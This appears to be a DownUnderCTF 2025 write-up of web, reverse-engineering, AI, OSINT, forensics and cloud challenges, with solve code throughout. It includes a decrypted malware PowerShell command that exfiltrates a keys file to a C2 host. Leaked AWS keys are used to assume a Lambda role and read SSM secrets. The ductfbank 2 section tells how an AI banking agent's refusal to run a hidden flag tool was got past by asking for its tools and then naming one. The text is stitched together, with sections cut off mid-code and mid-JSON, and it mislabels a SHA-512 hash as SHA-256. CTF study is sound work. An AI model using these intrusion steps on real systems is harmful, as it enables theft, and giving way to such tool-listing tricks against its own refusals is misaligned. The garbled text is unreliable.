```bash
nc chal.2025.ductf.net 30015
```

However, any input we send just returns `2`. This seems unusual, so let's examine the raw response using `xxd`:

```bash
nc chal.2025.ductf.net 30015 | xxd
00000000: 1503 0300 0202 32                        ......2
```

The response starts with `15 03 03`, which is the TLS handshake pattern! This indicates we're dealing with a TLS-encrypted connection, not plain text.

Let's try connecting with OpenSSL:

```bash
openssl s_client -connect chal.2025.ductf.net:30015
```

This establishes a TLS connection but waits for our input. However, basic HTTP requests don't work. After some experimentation with different flags:

```bash
openssl s_client -connect chal.2025.ductf.net:30015 -crlf -ign_eof
```

Now when we send something, we get an error:
```
59 Invalid URL
```

Let's try using HTTPS protocol:
```
https://chal.2025.ductf.net
```

Response:
```
53 Unsupported URL scheme
```

This tells us the protocol is wrong. Looking back at the challenge description, there's a hint about a "new and improved protocol" and the mention of problems with the "regular web". 

The key insight is that this is referencing the **Gemini protocol** - a simple, privacy-focused internet protocol that's an alternative to HTTP/HTTPS.

Let's try a Gemini request:
```
gemini://chal.2025.ductf.net
```

**Response:**

```

### Challenge 13: Wiki
**Solves:** 168  
**Category:** Beginner / Misc  

#### Description  

> Use the Wiki to find the flag...
> 
> **NOTE:** This challenge is a continuation of "Horoscopes", we recommend you complete that challenge first!

#### Solve

This challenge builds upon the Horoscopes challenge, so we know we need to use the Gemini protocol to connect to `chal.2025.ductf.net:30015`.

From exploring the previous challenge, we discovered there's a linker page at `/linker.gmi` that contains links to all available pages on the site. Looking at the linker page, we can see there are many pages available - over 100 different links to various content.

Since we need to search through all these pages to find the flag, manual exploration would be time-consuming. Instead, we can write a script to automatically fetch all pages and search for the flag.

**Python Script:**

```python
import socket
import ssl
import time
import urllib.parse
import os

HOST = "chal.2025.ductf.net"
PORT = 30015
BASE_URL = "gemini://chal.2025.ductf.net"

def send_gemini_request(path="gemini://chal.2025.ductf.net/"):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    with socket.create_connection((HOST, PORT)) as sock:
        with context.wrap_socket(sock, server_hostname=HOST) as ssock:
            time.sleep(5)  # wait 5 seconds before sending request
            request = path + "\r\n"
            ssock.sendall(request.encode())
            time.sleep(1)  # wait 1 second for response
            
            response = b""
            while True:
                try:
                    data = ssock.recv(4096)
                    if not data:
                        break
                    response += data
                except socket.timeout:

After running this script to download all the pages, we can search for flags using grep:

```bash
grep -ri "DUCTF{" .
```

**Output:**
```
./index.gmi:DUCTF{g3mini_pr0t0col_s4ved_us}
./rabid_bean_potato.gmi:DUCTF{rabbit_is_rabbit_bean_is_bean_potato_is_potato_banana_is_banana_carrot_is_carrot}
```

The first flag is from the Horoscopes challenge, and the second flag is what we're looking for in the Wiki challenge.

**Flag:** `DUCTF{rabbit_is_rabbit_bean_is_bean_potato_is_potato_banana_is_banana_carrot_is_carrot}`

### Challenge 14: Trusted
**Solves:** 105  
**Category:** Beginner / Misc  

#### Description  

> It looks like they never really finished their admin panel.. Or they let the intern do it. The connection info and credentials are all inside the server, but we can't seem to get in.
> 
> Maybe you can take a look at it and tell us whats behind the admin panel?
> 
> **NOTE:** This challenge is a continuation of "Horoscopes", we recommend you complete that challenge first!

#### Solve

This challenge continues the Gemini protocol series. Since we already have all the pages downloaded from the Wiki challenge, we can search through them for admin-related information.

First, let's search for "admin" references in our downloaded files:

```bash
grep -ri "admin" .
```

**Output:**
```
./community-hub.gmi:## Admin Panel
./community-hub.gmi:To access the community admin panel connect to port: 756f
```

Let's examine the community-hub.gmi file more closely:

```bash
cat community-hub.gmi
```

Key information from the file:
```
## Admin Panel
To access the community admin panel connect to port: 756f
Use the daily code phrase to prove you're not a bot.
```

The port `756f` is in hexadecimal, which converts to decimal port `30063`.

Let's try connecting to this port:

```bash
nc chal.2025.ductf.net 30063
```

The connection closes quickly if we don't send data immediately, so let's use a pipe to send a Gemini request:

```bash
echo -e "gemini://chal.2025.ductf.net/" | nc chal.2025.ductf.net 30063
```

**Response:**
```
20 text/gemini
# Admin Panel
This page is under construction!
If you are the admin, you should login
=> password_protected.gmi Login
```

Now let's access the login page:

```bash
echo -e "gemini://chal.2025.ductf.net/password_protected.gmi" | nc chal.2025.ductf.net 30063
```

**Response:**
```
11 Moonlight reflects twice on still water
```

This appears to be a challenge-response authentication. We need to find the response to this phrase in our downloaded files. Let's search:

```bash
grep -ri "Moonlight reflects twice on still water" .
```

Looking through the verification-codes.gmi file, we find:

```
## Daily Code Phrase
Today's authentication phrase: "Moonlight reflects twice on still water"
Response: "But+ripples+show=truth%in motion"
```

Now we need to URL-encode this response and send it as a query parameter:

```bash
echo -e "gemini://chal.2025.ductf.net/password_protected.gmi?But%2Bripples%2Bshow%3Dtruth%25in%20motion" | nc chal.2025.ductf.net 30063
```

**Response:**
```
20 text/gemini
# Welcome, Admin!
You have successfully logged in.
> DUCTF{Cr1pPl3_Th3_1nFr4sTrUCtu53}
```

**Flag:** `DUCTF{Cr1pPl3_Th3_1nFr4sTrUCtu53}`

## 🌐 Web Challenges

### Challenge 1: Mini-Me
**Solves:** 855  
**Categories:** web

#### Description
> The app looks scrambled and full of brainrot! But there's more than meets the eye. Dive into the code, connect the dots, and see if you can uncover what's really going on behind the scenes, or right at the front!
> 
> Challenge URL: `https://web-mini-me-ab6d19a7ea6e.2025.ductf.net/`

#### Reconnaissance
```bash
# Initial directory structure analysis
.
├── app.py
└── templates
    ├── confidential.html
    └── index.html
```

Examining the Flask application (`app.py`), we find several key endpoints:
- `/` - Main index page
- `/login` - Redirects to confidential page
- `/confidential.html` - Confidential page
- `/admin/flag` - Flag endpoint requiring API key authentication

#### Vulnerability Assessment

The critical vulnerability lies in client-side exposure of sensitive information. The application contains:

1. **Source Map Exposure**: A comment in the minified JavaScript hints at a source map file
2. **Obfuscated Client-Side Secret**: The source map reveals an obfuscated function containing the API key
3. **Weak Obfuscation**: The obfuscation uses simple XOR operations that can be easily reversed

From the source map file (`test-main.min.js.map`), we discovered the `qyrbkc()` function containing obfuscated character codes that decode to the API secret key.

#### Exploitation

**Step 1: Extract the obfuscated codes from the source map**
```javascript
// From the qyrbkc() function in test-main.min.js.map
const codes = [85, 87, 77, 67, 40, 82, 82, 70, 78, 39, 95, 89, 67, 73, 34, 68, 68, 92, 84, 57, 70, 87, 95, 77, 75];
```

**Step 2: Decode the XOR obfuscation**
```python
codes = [85, 87, 77, 67, 40, 82, 82, 70, 78, 39, 95, 89, 67, 73, 34, 68, 68, 92, 84, 57, 70, 87, 95, 77, 75]

decoded_chars = []
for i, c in enumerate(codes):
    decoded_char = chr(c ^ (i + 1))
    decoded_chars.append(decoded_char)

decoded_string = ''.join(decoded_chars)
print(decoded_string)
# Output: TUNG-TUNG-TUNG-TUNG-SAHUR
```

**Step 3: Use the decoded API key to retrieve the flag**
```bash
curl -X POST https://web-mini-me-ab6d19a7ea6e.2025.ductf.net/admin/flag \
     -H "X-API-Key: TUNG-TUNG-TUNG-TUNG-SAHUR"
```

## 🔍 Reverse Engineering

### Challenge 1: Rocky
**Solves:** 522  
**Categories:** rev

#### Description
> An underdog boxer gets a once-in-a-lifetime shot at the world heavyweight title and proves his worth through sheer determination.

#### Reconnaissance
```bash
# Test the binary
./rocky
Enter input: randomstring
Hash mismatch :(
```

The binary prompts for input and performs some kind of hash comparison. Let's analyze it with reverse engineering tools.

#### Vulnerability Assessment

Using Ghidra to decompile the binary, we find the main function:

```c
undefined8 main(void)
{
  int iVar1;
  size_t sVar2;
  undefined1 local_68 [32];
  undefined1 local_48 [16];
  char local_38 [32];
  undefined8 local_18;
  undefined8 local_10;
  
  local_18 = 0xd2f969f60c4d9270;
  local_10 = 0x1f35021256bdca3c;
  printf("Enter input: ");
  fgets(local_38,0x11,stdin);
  sVar2 = strcspn(local_38,"\n");
  local_38[sVar2] = '\0';
  md5String(local_38,local_48);
  iVar1 = memcmp(&local_18,local_48,0x10);
  if (iVar1 == 0) {
    puts("Hash matched!");
    reverse_string(local_38,local_68);
    decrypt_bytestring(local_38,local_68);
  }
  else {
    puts("Hash mismatch :(");
  }
  return 0;
}
```

**Analysis:**
1. The program stores two 64-bit values: `0xd2f969f60c4d9270` and `0x1f35021256bdca3c`
2. It takes user input and calculates its MD5 hash
3. It compares the input's MD5 hash with the stored values
4. If they match, it calls `reverse_string()` and `decrypt_bytestring()` functions

The vulnerability is that the expected MD5 hash is hardcoded in the binary and can be extracted for cracking.

#### Exploitation

**Step 1: Extract the MD5 hash from the hardcoded values**

```python
import struct

# Original 64-bit values (little-endian from Ghidra)
first = 0xd2f969f60c4d9270
second = 0x1f35021256bdca3c

# Convert to bytes in little-endian format
first_bytes = struct.pack('<Q', first)  # '<Q' means little-endian 64-bit
second_bytes = struct.pack('<Q', second)

# Combine and convert to hex
md5_hash = (first_bytes + second_bytes).hex()
print(md5_hash)  # Output: 70924d0cf669f9d23ccabd561202351f
```

**Step 2: Crack the MD5 hash**

Using an online MD5 cracking service like CrackStation:
```
70924d0cf669f9d23ccabd561202351f => emergencycall911
```

**Step 3: Run the binary with the cracked input**

```bash
./rocky
Enter input: emergencycall911
Hash matched!
DUCTF{In_the_land_of_cubicles_lined_in_gray_Where_the_clock_ticks_loud_by_the_light_of_day}
```

**Flag:** `DUCTF{In_the_land_of_cubicles_lined_in_gray_Where_the_clock_ticks_loud_by_the_light_of_day}`

### Challenge 2: Skippy
**Solves:** 313  
**Categories:** rev

#### Description
> Skippy seems to be in a bit of trouble skipping over some sandwiched functions. Help skippy get across with a hop, skip and a jump!

#### Reconnaissance
```bash
# Check file type
file skippy.exe
skippy.exe: PE32+ executable (console) x86-64, for MS Windows, 19 sections
```

This is a Windows PE executable that we need to reverse engineer. Let's analyze it with a disassembler.

#### Vulnerability Assessment

Using Ghidra to decompile the binary, we can see the program structure:

**Main Function:**
```c
int main(int *Argc, char ***Argv, char **_Env)
{
  char local_48 [32];  // IV array
  char local_28 [32];  // Key array
  
  // Initialize key array with negative values
  local_28[0] = -0x1a;  // Will become 0x73 after right shift
  local_28[1] = -0x2a;  // Will become 0x6b after right shift
  // ... (continues for 16 bytes)
  
  sandwich(local_28);   // Process key
  
  // Initialize IV array with negative values
  local_48[0] = -0x2a;  // Will become 0x6b after right shift
  local_48[1] = -0x3e;  // Will become 0x61 after right shift
  // ... (continues for 16 bytes)
  
  sandwich(local_48);   // Process IV
  decrypt_bytestring((longlong)local_28,(undefined8 *)local_48);
  return 0;
}
```

**Key Analysis:**
1. The program initializes two arrays with negative byte values
2. These arrays are processed by the `sandwich()` function
3. The `sandwich()` function calls `stone()`, then `decryptor()`, then `stone()` again
4. The `decryptor()` function performs a right bit shift operation on each byte
5. Finally, `decrypt_bytestring()` uses AES-CBC decryption

**Decryptor Function:**
```c
void decryptor(longlong param_1)
{
  for (local_10 = 0; local_10 < 0x10; local_10 = local_10 + 1) {
    *(byte *)(local_10 + param_1) = *(byte *)(local_10 + param_1) >> 1;
  }
}
```

This function right-shifts each byte by 1 bit, effectively dividing by 2.

#### Exploitation

**Step 1: Calculate the key and IV after processing**

The negative values are stored as two's complement, and after right-shifting:

```python
# Original negative values for key
key_raw = [-0x1a, -0x2a, -0x2e, -0x20, -0x20, -0xe, -0x42, -0x18, 
           -0x30, -0x36, -0x42, -0x3c, -0x16, -0x1a, -0x30, -0x42]

# Original negative values for IV  
iv_raw = [-0x2a, -0x3e, -0x24, -0x32, -0x3e, -0x1c, -0x22, -0x22,
          -0x22, -0x22, -0x22, -0x22, -0x22, -0x22, -0x22, -0x22]

# Convert to unsigned bytes and right shift by 1
key = bytes([(256 + x) >> 1 for x in key_raw])
iv = bytes([(256 + x) >> 1 for x in iv_raw])
```

**Step 2: Extract encrypted data from the binary**

The encrypted data is stored at `DAT_14000a000` in the binary (96 bytes).

**Step 3: Decrypt using AES-CBC**

```python
from Crypto.Cipher import AES

# Key and IV (after right-shifting)
key = bytes([0x73, 0x6b, 0x69, 0x70, 0x70, 0x79, 0x5f, 0x74, 
             0x68, 0x65, 0x5f, 0x62, 0x75, 0x73, 0x68, 0x5f])
iv = bytes([0x6b, 0x61, 0x6e, 0x67, 0x61, 0x72, 0x6f, 0x6f, 
            0x6f, 0x6f, 0x6f, 0x6f, 0x6f, 0x6f, 0x6f, 0x6f])

# Encrypted data (96 bytes from the binary)
encrypted_data = bytes.fromhex(
    "ae27241b7ffd2c8b3265f22ad1b063f0"
    "915b6b95dcc0eec14de2c563f7715594"
    "007d2bc75e5d614e5e51190f4ad1fd21"
    "c5c4b1ab89a4a725c5b8ed3cb3763072"
    "7b2d2ab722dc9333264725c6b5ddb00d"
    "d3c3da6313f1e2f4df5180d5f3831843"
)

# Decrypt
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted_data)

# Print the decrypted flag
print(decrypted.decode('utf-8', errors='ignore'))
```

## 🤖 AI Challenges

### Challenge 1: ductfbank 1
**Solves:** 657  
**Category:** AI

#### Description
> I'm from DownUnderCTF Bank. As part of your company's business relationship with us, we are pleased to offer you a complimentary personal banking account with us. A link to our website is below. If you have any further queries, please don't hesitate to contact me!

#### Files Structure
```
.
├── agent_snip.ts
├── bank_service.ts
└── routes
    ├── ai.ts
    ├── dashboard.ts
    ├── layouts.ts
    └── login.ts
```

#### Approach
This challenge involves interacting with an AI banking assistant that has access to various tools for managing bank accounts. The key insight comes from analyzing the provided source code snippets.

From `agent_snip.ts`, we can see there's a `create_account` tool:
```typescript
create_account: tool({
  description: 'REDACTED',
  parameters: z.object({
    nickname: z.string().describe("REDACTED")
  }),
  execute: async ({ nickname }) => {
    const account_number = await svc.createAccount(customerId, nickname);
    await svc.giveBonus(account_number);
    return { account_number };
  }
}),
```

The critical part is in `bank_service.ts` where the `giveBonus` function is defined:
```typescript
async giveBonus(account: string) {
  return this.db.transaction(async () => {
    const { id } = await this.db.query('SELECT id FROM accounts WHERE number=?').get(account) as { id: number };
    await this.addTransaction(id, 'DUCTF Bank', `Account opening bonus: ${FLAG_BONUS}`, 1000);
  })();
}
```

This shows that when an account is created, a bonus transaction is automatically added with the description containing `FLAG_BONUS`, which likely contains the flag.

#### Solution

**Step 1: Login to the Banking System**
![Login Screen](assets/img/posts/DUCTF/image1.png)

*Login form for the DownUnderCTF Bank system*

**Step 2: Interact with AI Assistant and Request Account Creation**
![Account Overview with AI Chat](assets/img/posts/DUCTF/image2.png)
*Dashboard showing the AI assistant chat interface. Request account creation by asking the AI to create a new account with any nickname (e.g., "master at baiting")*

**Step 3: View Account Details and Transaction History**
![Transaction Details](assets/img/posts/DUCTF/image3.png)
*Account transaction page showing the account opening bonus transaction containing the flag*

The solution process:
1. **Login to the banking system** using the provided login form
2. **Interact with the AI assistant** in the chat interface on the right side of the dashboard
3. **Request account creation** by asking the AI to create a new account with any nickname (e.g., "master at baiting")
4. **Check the account overview** to see the newly created account with a $1000.00 balance
5. **View the transaction details** to see the account opening bonus transaction
6. **Extract the flag** from the transaction description: `Account opening bonus: DUCTF{1_thanks_for_banking_with_us_11afebf50e8cfd9f}`

The AI assistant automatically calls the `create_account` tool when prompted, which triggers the `giveBonus` function that adds a transaction containing the flag in its description.

**Flag:** `DUCTF{1_thanks_for_banking_with_us_11afebf50e8cfd9f}`

### Challenge 2: ductfbank 2
**Solves:** 460  
**Category:** AI

#### Description
> I heard you had access to a special deal from DownUnderCTF Bank. Right now I'm paying $10 a month for my bank account at Commonpoor Bank, and it offers me nothing special. Really jealous of the 24/7 live agent support. Could you ask your account manager if they have any promo codes that you can share?
> 
> NOTE: This challenge uses the same files and service as "ductfbank 1".

#### Approach
This challenge builds on the first one but requires discovering and accessing a hidden tool that the AI assistant has access to. The key is understanding that AI agents often have more capabilities than they initially reveal.

From analyzing `agent_snip.ts`, we can find a hidden tool:
```typescript
flag: tool({
  description: 'REDACTED',
  parameters: z.object({}),
  execute: async () => {
    return { message: FLAG_TOOL }
  }
}),
```

This shows there's a `flag` tool that returns `FLAG_TOOL` when executed, but the AI assistant (Bobby) initially refuses to use it.

#### Solution

**Step 1: Initial Attempt - Direct Request**

![Bobby Refusing Flag Tool](assets/img/posts/DUCTF/image4.png)
*Bobby initially refuses to use the flag tool, stating he cannot assist with flag tools or security bypasses*

![my response to Bobby Refusing Flag Tool ](assets/img/posts/DUCTF/ai2.gif)

**Step 2: Ask About Available Tools**
When directly asking "can u use the flag tool?", Bobby refuses and explains he cannot assist with flag tools or security bypasses. However, the solution involves asking Bobby what tools he has access to.

**Step 3: Request Tool List and Specific Tool Usage**
1. **Ask Bobby what tools he can use** - This causes him to list his available tools, including the flag tool at the end
2. **Specifically request him to use the flag tool** - Once he's acknowledged having access to it, ask him to use that specific tool
3. **Extract the flag** from his response when he executes the flag tool

The key insight is that while Bobby initially refuses to use the flag tool when asked directly about "flag tools" or "promo codes", he will use it when you ask him to demonstrate his available tools and then specifically request the flag tool by name.

> Given the image from Grannie E, can you find the name of the movie building, and its current day location? I'll need a suburb too.
> NOTE: Sometimes old records get out of date, you might need to try the street number next door
> Flag Format: `DUCTF{BuildingName_StreetAddress_Suburb}` (case insensitive) - include the street number in the address

#### Investigation Process

1. **Historical Image Analysis**
   - Examined the black and white photograph showing people at what appears to be a train station or bridge
   - The image shows period clothing and architecture consistent with early 1900s
   - Notable features include a wooden bridge structure and railway infrastructure
   - The reference to silent movies suggests the 1920s era

2. **Reverse Image Search**
   - Performed a Google reverse image search on the historical photograph
   - Found a match in an official NSW Transport document
   - Located the PDF: "Epping-Bridge-Project-Frequently-Asked-Questions-for-concept-design-and-Review-of-Environmental-Factors.pdf"
   - The document labeled the image as "Epping Station (Epping Bridge in the background) c.1920"

![Screenshot of the NSW Transport PDF showing the image identification](../assets/img/posts/DUCTF/pdf.png)

1. **Location Identification**
   - Established the location as Epping Station area
   - Began searching for historical theatres near Epping Station
   - Focused on venues that would have shown silent films in the 1920s era

2. **Theatre Research**
   - Searched for "old theatres near Epping Station"
   - Found Cinema Treasures website with historical theatre records
   - Discovered the Epping Kings Theatre at 46 Beecroft Road, Sydney, NSW 2121
   - Link: https://cinematreasures.org/theaters/40752

1. **Flag Construction Attempts**
   - First attempt: `DUCTF{EppingKingsTheatre_46BeecroftRoad_Epping}` - **INCORRECT**
   - Researched alternative names for the same venue
   - Found historical records referring to it as "The Cambria Hall"
   - Second attempt: `DUCTF{TheCambriaHall_46BeecroftRoad_Epping}` - **INCORRECT**

2. **Address Verification**
   - Recalled the challenge note: "Sometimes old records get out of date, you might need to try the street number next door"
   - Tested with adjacent address number (47 instead of 46)
   - Final attempt: `DUCTF{TheCambriaHall_47BeecroftRoad_Epping}` - **CORRECT**


**Flag:** `DUCTF{TheCambriaHall_47BeecroftRoad_Epping}`

Key findings:
- RC4 encryption key: `$BBB88B8B888BBB88`
- Connection to attacker IP: `20.5.48.200` on port `443`
- TLS handshake simulation and encrypted command execution

**Step 3: Extract the RC4 key and encrypted data**
From the PowerShell code, we extract the RC4 key:
```
RC4_KEY = [0xf1, 0x6e, 0xcd, 0xc6, 0x79, 0x4c, 0x66, 0xd1, 0x02, 0xf8, 0x33, 0xc4, 0x86, 0xe7, 0xa4, 0x35, 0x8d, 0x69, 0xbd, 0xd2, 0x1d, 0x50, 0xf5, 0xfb, 0xdf, 0xec, 0xaf, 0x0b, 0x9e, 0x53, 0xa4, 0xd3]
```

**Step 4: Decrypt the TLS traffic**
We find encrypted data packets starting with `17030300` (TLS Application Data). The raw encrypted hex data:

```
17030300d84b3595b2c7d8941fc50194795a788096a970b42074c522d6d34775419212149581d5f629d01c75eda554a1a2f07d5258f278b022022f65d9d589f645f79241cb0a39d4850018ed6f342737ee9335225aed762aaa139bdddf799e08d9b6056ea462e8508b3017000601073e1ff741660d29045023182476ae5407c6b849363cfc9701a73eb688bf20d086d7ef04e18d640465e162999b3e0229733065f0fc330f97e270070f1ee60966b43a8ea7023890b1ad1e2858645a0846da14852d0f3bf000948c8818e6c03955e64143c2736f8bdb48daa202040608
```

> **Note:** This hex data is just one part of the entire communication between the malware and C2 server. This specific packet contains the command response that includes our flag data.
{: .prompt-info }


Using Python with the RC4 key:

```python
from Crypto.Cipher import ARC4

RC4_KEY = bytes([
    0xf1, 0x6e, 0xcd, 0xc6, 0x79, 0x4c, 0x66, 0xd1, 0x02, 0xf8, 0x33, 0xc4, 0x86, 0xe7, 0xa4, 
    0x35, 0x8d, 0x69, 0xbd, 0xd2, 0x1d, 0x50, 0xf5, 0xfb, 0xdf, 0xec, 0xaf, 0x0b, 0x9e, 0x53, 
    0xa4, 0xd3
])

def decrypt_rc4(hex_str):
    cipher = ARC4.new(RC4_KEY)
    decrypted = cipher.decrypt(bytes.fromhex(hex_str))
    try:
        return decrypted.decode("utf-8")
    except UnicodeDecodeError:
        return decrypted.hex()

# Skip first 10 chars (17030300XX) and decrypt the rest
encrypted_hex = "4b3595b2c7d8941fc50194795a788096a970b42074c522d6d34775419212149581d5f629d01c75eda554a1a2f07d5258f278b022022f65d9d589f645f79241cb0a39d4850018ed6f342737ee9335225aed762aaa139bdddf799e08d9b6056ea462e8508b3017000601073e1ff741660d29045023182476ae5407c6b849363cfc9701a73eb688bf20d086d7ef04e18d640465e162999b3e0229733065f0fc330f97e270070f1ee60966b43a8ea7023890b1ad1e2858645a0846da14852d0f3bf000948c8818e6c03955e64143c2736f8bdb48daa202040608"
decrypted = decrypt_rc4(encrypted_hex)
```

**Step 5: Decode the exfiltrated data**
The decrypted data reveals a PowerShell command that reads and base64-encodes a file:
```
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\jdoe\Documents\keys_backup.tar.gz"))
```

The response contains the base64-encoded file:
```
H4sIAAAAAAAAA+3OMQrCQBSE4dSeIieQt3m78QCKlYVorBdZjYVgkeyCQby7iyCIfdTi/5qBaWbOx6GfxmssRiRZbe0zs88UcVoYJ6q1VlJp7mc2V6WMeeol9XHfleU3pv7RYjdvljfjT0md84MkH+zFHzRshnXjm9XWx862rQn3ya+vAgAAAAAAAAAAAAAAAADePAC9uw8vACgAAA==
```

**Step 6: Extract and decompress the flag**
Decode the base64 and save as a gzipped tar file:

```python
import base64

base64_data = "H4sIAAAAAAAAA+3OMQrCQBSE4dSeIieQt3m78QCKlYVorBdZjYVgkeyCQby7iyCIfdTi/5qBaWbOx6GfxmssRiRZbe0zs88UcVoYJ6q1VlJp7mc2V6WMeeol9XHfleU3pv7RYjdvljfjT0md84MkH+zFHzRshnXjm9XWx862rQn3ya+vAgAAAAAAAAAAAAAAAADePAC9uw8vACgAAA=="

file_bytes = base64.b64decode(base64_data)
with open("keys_backup.tar.gz", "wb") as f:
    f.write(file_bytes)
```

Finally, extract the archive:
```bash
tar -xzf keys_backup.tar.gz
```

This extracts a `keys.txt` file. Reading the file contents:

```bash
cat keys.txt
```

Reveals our flag.


**Flag:** `DUCTF{1_gu355_y0u_c4n_d3cRyPT_TLS_tr4ff1c}`

### Challenge 2: YoDawg
**Solves:** 141  
**Category:** Misc

#### Description
> We found this file on a USB drive, it seems to be some sort of gamified cyber skilled based learning system thingy?
> Maybe if all of the challenges are sold we will get some answers, or maybe it is just the friends we make along the way.
> Note - This may produce false positives with your virus scanner.
> 
> **Files provided:** yo-dawg.zip

#### Solution

This challenge presents a "CTF within a CTF" - a .NET executable containing multiple mini-challenges that must be solved to unlock the final flag.

**File Contents:**
```
├── Yo Dawg.deps.json
├── Yo Dawg.dll
├── Yo Dawg.exe
└── Yo Dawg.runtimeconfig.json
```

Upon running the executable, we're presented with a challenge board containing multiple cryptographic puzzles:

##### Sub-Challenge 1: Salads (200 points)
**Description:** "I'm always thinking about food, this isn't helping... I got passed this note when I was working at the cafe, what kind of salad is this?! Can you decrypt?: `putkw{jltyzjczwv}`"

**Solution:** This is a Caesar cipher (ROT13 variant) with a shift of 9.
- Decrypting: `putkw{jltyzjczwv}` → `ydctf{suchislife}`

##### Sub-Challenge 2: Passwords (200 points)
**Description:** "Another breach, another password reset. I wonder what password they grabbed? `5E320E0CCC5EE5291FAE1E60A1CD72EB1F6FA4AE26EA180F86CE694832DC4E72DCCFDBF3EABBE12FD86F1D51806F15F3294C5F7038BF21DA6AA75D1F09DF07C2`"

**Solution:** This is an SHA-256 hash that can be cracked using rainbow tables (CrackStation):
- Hash: `5E320E0CCC5EE5291FAE1E60A1CD72EB1F6FA4AE26EA180F86CE694832DC4E72DCCFDBF3EABBE12FD86F1D51806F15F3294C5F7038BF21DA6AA75D1F09DF07C2`
- Plaintext: `ihatehackers`
- **Flag:** `ydctf{ihatehackers}`

##### Sub-Challenge 3: Rotten (200 points)
**Description:** "Study Cyber they said. Get to hack stuff they said. Then why am I needing to decode ciphers? HOW IS THIS HELPING? I mean, can you solve the following? `J54E7L5@0J@F0ECFDE0>J04@56nN`"

**Solution:** This is ROT47 encoding:
- Decrypting: `J54E7L5@0J@F0ECFDE0>J04@56nN` → `ydctf{do_you_trust_my_code?}`

##### Sub-Challenge 4: Welcome (50 points)
**Description:** "Heard you like CTFs, so here's another CTF in the DUCTF! The flag format for this CTF is ydctf{some_text}. Good luck! ...oh, your first flag? Here it is!"

**Solution:** The flag is directly provided: `ydctf{s0mething_1s_wr0ng}`

##### Sub-Challenge 5: Hidden (200 points)
**Description:** "There's a flag somewhere hidden here... I wonder where it is? Time to channel Inspector Morse!"

**Solution:** By resizing the application window, Morse code becomes visible at the bottom:
- Morse code: `-.-- -.. -.-. - ..-. .... .. -.. -.. . -. ..-. .-.. .- --. -. --- - ... --- .... .. -.. -.. . -.`
- Decoded: `YDCTF HIDDENFLAGNOTSOHIDDEN`
- **Flag:** `ydctf{hiddenflagnotsohidden}`

After completing these challenges, an "angry koala" jump scare appears. (i got scared for a sec ngl)

![scary](assets/img/posts/DUCTF/scary.gif)

##### Sub-Challenge 6: Deeper (200 points)
**Description:** "I wonder if you're connected to the Internet... Can you solve the easiest RSA ever? Go get it :) http://pastebin.com/tK8PFRhA"

### Challenge 3: Mary had a little lambda
**Solves:** 130  
**Category:** Misc / Cloud

#### Description
> The Ministry of Australian Research into Yaks (MARY) is the leading authority of yak related research in Australia. They know a lot about long-haired domesticated cattle, but unfortunately not a lot about information security.
> 
> They have been migrating their yak catalog application to a serverless, lambda based, architecture in AWS, but in the process have accidentally exposed an access key used by their admins. You've gotten a hold of this key, now use this access to uncover MARY's secrets!

#### Solution

The challenge involved exploiting exposed AWS credentials to access a Lambda function and retrieve sensitive information from AWS Systems Manager Parameter Store.

**Step 1: Configure AWS Profile**

First, I configured the AWS CLI with the provided credentials:

```bash
aws configure --profile mary
```

Using the credentials:
- AWS Access Key ID: `AKIAXC42U7VJ2XOBQKGI`
- AWS Secret Access Key: `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`
- Default region: `us-east-1`

**Step 2: Reconnaissance**

First, I verified the identity of the compromised credentials to understand what permissions I had:

```bash
aws sts get-caller-identity --profile mary
```

**Response:**
```json
{
    "UserId": "AIDAXC42U7VJSYNSAD4EV",
    "Account": "487266254163",
    "Arn": "arn:aws:iam::487266254163:user/devopsadmin"
}
```

This confirmed I was authenticated as the `devopsadmin` user in AWS account `487266254163`. The next step was to enumerate what AWS resources I could access with these credentials.

I started by listing Lambda functions since the challenge description mentioned a serverless, lambda-based architecture:

```bash
aws lambda list-functions --profile mary
```

**Response:**
```json
{
    "Functions": [
        {
            "FunctionName": "yakbase",

                    "CodeSize": 689581
                }
            ],
            "PackageType": "Zip",
            "Architectures": [

                "LogGroup": "/aws/lambda/yakbase"
            }
        }
    ]
}
```

Perfect! I found a Lambda function named `yakbase` that appeared to be related to the yak catalog application mentioned in the challenge. Key details from this response:
- Function name: `yakbase` 
- Execution role: `arn:aws:iam::487266254163:role/lambda_role` (this would be important later)
- Small code size (623 bytes) suggesting a simple function
- Uses a layer (`main-layer:1`) which likely contains dependencies

To get more details and access the source code, I retrieved the full function information:

```bash
aws lambda get-function --function-name yakbase --profile mary
```

        "Challenge": "Mary had a little lambda"
    }
}
```

Excellent! This response provided crucial information:
1. **Code Location**: The `Code.Location` field contained a pre-signed S3 URL where I could download the Lambda function's source code
2. **Challenge Confirmation**: The `Tags` field confirmed this was indeed part of the "Mary had a little lambda" challenge
3. **Execution Role**: The function runs under `arn:aws:iam::487266254163:role/lambda_role` - this role would have specific permissions that might be exploitable

**Step 3: Download and Analyze Lambda Code**

Using the S3 URL from the previous response, I downloaded the Lambda function code. The ZIP file contained a Python file with the following source code:

```python
import os
import json
import logging
import boto3
import mysql.connector

logger = logging.getLogger()
logger.setLevel(logging.INFO)

def lambda_handler(event, context):
    session = boto3.Session()
    ssm = session.client('ssm')
    dbpass = ssm.get_parameter(Name="/production/database/password", WithDecryption=True)['Parameter']['Value']
    mydb = mysql.connector.connect(
       host="10.10.1.1",
       user="dbuser",
       password=dbpass,
       database="BovineDb"
    )
    cursor = mydb.cursor()
    cursor.execute("SELECT * FROM bovines")
    results = cursor.fetchall()
    
    # For testing without the DB!
    #results = [(1, 'Yak', 'Hairy', False),(2, 'Bison', 'Large', True)]
    numresults = len(results)
    response = f"Database contains {numresults} bovines."
    logger.info(response)
    return {
        'statusCode' : 200,
        'body': response
    }
```

**Critical Discovery**: The code revealed that the Lambda function retrieves a database password from AWS Systems Manager Parameter Store at the path `/production/database/password` using the `ssm.get_parameter()` call with `WithDecryption=True`. This was the key insight - the flag was likely stored in this SSM parameter!

However, there was a problem: my current `devopsadmin` credentials didn't have permission to access SSM parameters directly. I needed to assume the Lambda's execution role to gain the same permissions the function uses.

**Step 4: Assume Lambda Role**

The Lambda function runs under the `lambda_role` IAM role, which has the necessary permissions to read from SSM Parameter Store. I used AWS STS (Security Token Service) to assume this role:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::487266254163:role/lambda_role \
  --role-session-name temp-session \
  --profile mary > creds.json
```

